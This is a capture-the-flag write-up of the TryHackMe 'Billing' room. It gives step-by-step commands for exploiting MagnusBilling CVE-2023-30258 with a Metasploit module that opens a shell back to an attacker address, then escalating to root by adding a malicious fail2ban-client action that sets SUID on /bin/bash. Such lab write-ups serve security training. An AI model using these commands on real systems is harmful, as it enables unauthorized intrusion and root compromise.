# 🛡️ TryHackMe — Billing

> **Linux Privilege Escalation | Web Exploitation | CVE-2023-30258**

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Platform](https://img.shields.io/badge/Platform-Linux-red)
![Tools](https://img.shields.io/badge/Tools-Nmap%20%7C%20Metasploit%20%7C%20Fail2Ban-blue)
![Status](https://img.shields.io/badge/Status-Pwned-success)

**Objective:** Gain an initial foothold via an exposed web application and escalate privileges by abusing a security tool's configuration.

---


## 🎯 Objective

**Gain a shell, find the way, and escalate privileges to root.**

This room demonstrates a complete attack chain:

`Recon → Web Enumeration → RCE → Initial Shell → Enumeration → Fail2Ban Abuse → Root`

## 🧩 Attack Chain

```text
┌──────────────┐
│  Nmap Scan   │
└──────┬───────┘
       ↓
┌─────────────────────┐
│   MagnusBilling     │
│   Identified        │
└─────────┬───────────┘
          ↓
┌─────────────────────┐
│ CVE-2023-30258 RCE  │
└─────────┬───────────┘
          ↓
┌─────────────────────┐
│ Shell as asterisk   │
└─────────┬───────────┘
          ↓
┌─────────────────────┐
│   sudo -l           │
│ fail2ban-client     │
└─────────┬───────────┘
          ↓
┌─────────────────────┐
│ Fail2Ban Action     │
│ Manipulation        │
└─────────┬───────────┘
          ↓
┌─────────────────────┐
│   SUID Bash         │
└─────────┬───────────┘
          ↓
       👑 ROOT



```
## 🔎 1. Reconnaissance

The first step was to perform network enumeration against the target.
I used Nmap with service/version detection and default scripts:
```
nmap -sC -sV -p- <TARGET_IP>
```
<img width="849" height="397" alt="1" src="https://github.com/user-attachments/assets/eaf73267-28f7-4130-897a-14d8e5b54f05" />

The scan identified multiple services running on the target. The HTTP service on port 80 was particularly interesting because Nmap identified the HTTP page title as:

> **MagnusBilling**

This gave us our first strong indication of the web application running on the target.

## 🌐 2. Identifying MagnusBilling

The important discovery from the HTTP enumeration was:
> **http-title: MagnusBilling**
This is how the application was initially identified.

The application was also accessible through the **/mbilling/** path.

At this point, the reasoning was:
```
Port 80 is open
        ↓
HTTP service identified
        ↓
HTTP page title reveals MagnusBilling
        ↓
MagnusBilling identified
        ↓
Research vulnerabilities affecting MagnusBilling
```
## Real-World Methodology

In a real penetration test, I would not assume that an application is MagnusBilling simply because port 80 is open.
Instead, I would fingerprint the application using multiple sources of information.

Useful techniques include:

- Inspecting the HTML source
- Looking at HTTP response headers
- Examining cookies
- Looking for distinctive directories
- Looking for JavaScript files
- Checking error messages
- Using technology fingerprinting tools
- Searching for version information

For example:
``` whatweb http://<TARGET_IP> ```

The important lesson is: **An open port identifies a service, not necessarily the application. Further enumeration is required to fingerprint the application.**

## 📸 MagnusBilling Identification

After identifying MagnusBilling, I searched for known vulnerabilities affecting the application.

The vulnerability used in this room was: **CVE-2023-30258**

The vulnerability allows **unauthenticated remote command execution against vulnerable MagnusBilling installations.**

The corresponding Metasploit module was:

```
exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
```
The module was located by searching Metasploit for MagnusBilling-related exploits.
```
search magnusbilling
```

<img width="809" height="606" alt="2" src="https://github.com/user-attachments/assets/c091bb87-a73d-41b6-a639-224d29df8c5f" />

## 💥 4. Exploitation with Metasploit

The MagnusBilling exploit was loaded:
```
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
```

Before running the exploit, I examined the available targets.
```
show targets
```

The module provided three targets:
```
0  PHP
1  Unix Command
2  Linux Dropper
```
> **Why Was the Unix Command Target Selected?**
I selected:
```
set target 1
```

The reason was based on the target environment and the objective.

- The target was identified as a Linux host, and the goal was to obtain operating-system command execution and ultimately a shell.
Therefore, the Unix Command target was appropriate.

- The important point is that the target number itself should not be memorized.

For a different exploit, target 1 could mean something completely different.

Instead, the process should be:
```
show targets
      ↓
Understand each target
      ↓
Identify target OS
      ↓
Understand vulnerability behavior
      ↓
Determine desired result
      ↓
Select appropriate target
```
In this case:
```
Linux host
     +
OS command execution
     ↓
Unix Command target
```

<img width="866" height="404" alt="5" src="https://github.com/user-attachments/assets/58897558-3f94-4ee7-b350-d84e955e245c" />

> **Configuring the Exploit**
The remote target was configured:
```
set RHOSTS <TARGET_IP>
```
The local callback address was configured:
```
set LHOST <ATTACKER_IP>
```
The exploit was then executed.

The exploit successfully established a command shell on the target.

<img width="953" height="697" alt="6" src="https://github.com/user-attachments/assets/653a3f03-19f6-492f-8afc-53a4c0cae809" />

## 🐚 5. Initial Shell

After exploitation, an initial shell was obtained.
The result showed that this was a low-privileged account.

This is an important point in a penetration test:

**Obtaining a shell does not necessarily mean that the machine has been fully compromised.**

At this stage, the objective changed from initial access to local enumeration and privilege escalation.

## 🐧 6. Local Enumeration

After obtaining the initial shell, I began enumerating the local system.

One of the first areas to inspect was the **/home** directory:
```
cd /home
ls
```
The system contained a directory associated with the magnus user.

The user's home directory was then examined.
```
cd /home/magnus
ls
```
Among the files present was:
```
user.txt
```

The user flag was retrieved using:
```
cat /home/magnus/user.txt
```

## 🔐 8. Privilege Escalation Enumeration

After obtaining the user flag, the next objective was to escalate privileges.

A standard Linux privilege-enumeration step is checking the current user's sudo permissions.

I ran:
```
sudo -l
```
The important result was:

User magnus may run the following commands:
```
(ALL) NOPASSWD: /usr/bin/fail2ban-client
```
This was the critical finding.

## 🧠 9. Understanding the sudo -l Result

The entry:
```
(ALL) NOPASSWD: /usr/bin/fail2ban-client
```
can be broken down into three parts.
```
(ALL)
```
This indicates that the command can be executed as another user, including root.
```
NOPASSWD
```
The user does not need to provide a password when executing the permitted command through sudo.
```
/usr/bin/fail2ban-client
```
This is the specific program that the user is allowed to execute with elevated privileges.

Therefore, the effective situation was:
```
magnus
   │
   │ sudo
   ▼
fail2ban-client
   │
   │ elevated privileges
   ▼
root-controlled Fail2Ban
```

This configuration was therefore worth investigating.

<img width="994" height="438" alt="7" src="https://github.com/user-attachments/assets/aa7dce04-edda-4ab9-b2ef-ba38ce31a024" />

## 🛡️ 10. What Is Fail2Ban?

Before exploiting the configuration, it is useful to understand what Fail2Ban does.

Fail2Ban is a Linux security tool designed to detect suspicious activity by monitoring log files.

For example, an SSH service might generate repeated failed-login messages:
```
Failed password for admin from 10.10.10.20
Failed password for admin from 10.10.10.20
Failed password for admin from 10.10.10.20
```
Fail2Ban can detect these repeated failures and take an action against the source IP.

The basic concept is:
```
          Log Files
              │
              ▼
           Filter
              │
              ▼
            Jail
              │
      suspicious activity
              │
              ▼
            Action
              │
              ▼
       Block attacker IP
```
Fail2Ban therefore normally operates with elevated privileges because it may need to modify firewall rules or perform other system-level actions.

## 🔎 11. Enumerating Fail2Ban

Because magnus had permission to execute fail2ban-client through sudo, I used it to enumerate the active Fail2Ban configuration.
```
sudo /usr/bin/fail2ban-client status
```
The command showed several active jails, including:
```
ast-cli-attack
ast-ng-c-200
asterisk-iptables
asterisk-manager
ip-blacklist
mbilling_ddos
mbilling_login
sshd
```
One of the jails, ast-cli-attack, was investigated further.

## 🔍 12. Investigating ast-cli-attack

I checked the actions associated with the jail:
```
sudo /usr/bin/fail2ban-client get ast-cli-attack actions
```
An existing action associated with the jail was returned.

The important discovery was that, because **fail2ban-client** was available through privileged **sudo**, the jail's action configuration could be manipulated.

This created a potential privilege-escalation path.

The reasoning was:
```
sudo access to fail2ban-client
          ↓
Ability to control Fail2Ban
          ↓
Enumerate jails
          ↓
Inspect actions
          ↓
Determine whether an action can be modified
```

<img width="833" height="741" alt="8" src="https://github.com/user-attachments/assets/db8a6415-126f-4be1-9fa1-f18a0e27a982" />

## 🚨 13. Creating a Malicious Fail2Ban Action

A new action called **evil** was added to the **ast-cli-attack jail**:
```
sudo /usr/bin/fail2ban-client set ast-cli-attack addaction evil
```
The action was then configured so that its **actionban** command would execute:
```
chmod +s /bin/bash
```
The full configuration command was:
```
sudo /usr/bin/fail2ban-client set ast-cli-attack action evil actionban "chmod +s /bin/bash"
```

## 🧩 14. Why Does **chmod +s /bin/bash** Matter?

The command:
```
chmod +s /bin/bash
```
sets the **SUID (Set User ID)** permission on the Bash binary.

SUID is a special Linux permission that causes an executable to run with the privileges of the file owner.

If Bash is owned by root and has the SUID bit set, it can potentially be used to obtain a shell retaining root privileges.

The attack therefore becomes:
```
Fail2Ban
    │
    │ executes action
    ▼
chmod +s /bin/bash
    │
    ▼
Bash receives SUID permission
    │
    ▼
Execute privileged Bash
    │
    ▼
Root shell
```
The key issue is that Fail2Ban was operating with elevated privileges while we were able to manipulate an action through the privileged **fail2ban-client** interface.

## ⚡ 15. Triggering the Malicious Action

The malicious action was triggered by banning an IP address:
```
sudo /usr/bin/fail2ban-client set ast-cli-attack banip 1.2.3.5
```
This caused Fail2Ban to execute the configured **actionban** command.

The result was:
```
chmod +s /bin/bash
```
The SUID permission was therefore applied to Bash.

<img width="1124" height="465" alt="9" src="https://github.com/user-attachments/assets/d452b325-8232-457b-b78d-c7116e90420e" />

## 👑 16. Obtaining the Root Shell

With the SUID permission applied to Bash, I launched Bash using:
```
/bin/bash -p
```
The **-p** option is important because it tells Bash to preserve the privileged effective user ID instead of dropping it.

I then checked the current identity:
```
whoami
```
The result was:
```
root
```
This confirmed successful privilege escalation.

## 🏆 17. Root Flag

With root access obtained, the root flag was retrieved:
```
cat /root/root.txt
```
